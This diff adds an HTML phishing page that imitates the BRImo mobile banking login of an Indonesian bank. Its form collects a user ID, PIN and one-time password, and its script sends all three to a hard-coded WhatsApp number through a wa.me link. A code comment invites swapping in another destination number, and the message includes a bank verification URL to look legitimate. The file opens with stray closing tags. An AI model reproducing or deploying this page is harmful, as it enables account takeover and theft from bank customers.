@@ -1,0 +1,81 @@
+
+</body>
+</html><!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>Login BRImo</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #1b1b32;
+      color: #f5f6f7;
+      padding: 20px;
+    }
+    .login-box {
+      background: white;
+      color: black;
+      padding: 20px;
+      border-radius: 10px;
+      max-width: 400px;
+      margin: auto;
+      box-shadow: 0 0 10px rgba(0,0,0,0.3);
+    }
+    h2 {
+      text-align: center;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      margin: 8px 0;
+      box-sizing: border-box;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+    }
+    button {
+      width: 100%;
+      padding: 10px;
+      background-color: #0057a0;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #003e73;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="login-box">
+    <h2>Login BRImo</h2>
+    <input id="user" placeholder="Masukkan User ID">
+    <input id="pin" type="password" placeholder="Masukkan PIN">
+    <input id="otp" type="number" placeholder="Masukkan OTP">
+    <button onclick="kirim()">Login</button>
+  </div>
+
+  <script>
+    function kirim() {
+      const user = document.getElementById("user").value;
+      const pin = document.getElementById("pin").value;
+      const otp = document.getElementById("otp").value;
+
+      const pesan = 
+        "*BRImo Login Percobaan*\n" +
+        "👤 User ID: " + user + "\n" +
+        "🔒 PIN: " + pin + "\n" +
+        "🔢 OTP: " + otp + "\n" +
+        "📎 Verifikasi: https://bri.co.id/verifikasi";
+
+      const noWa = "6283898203013"; // ganti dengan nomor tujuan
+      const linkWa = "https://wa.me/" + noWa + "?text=" + encodeURIComponent(pesan);
+
+      window.location.href = linkWa;
+    }
+  </script>
+
+</body>
+</html>
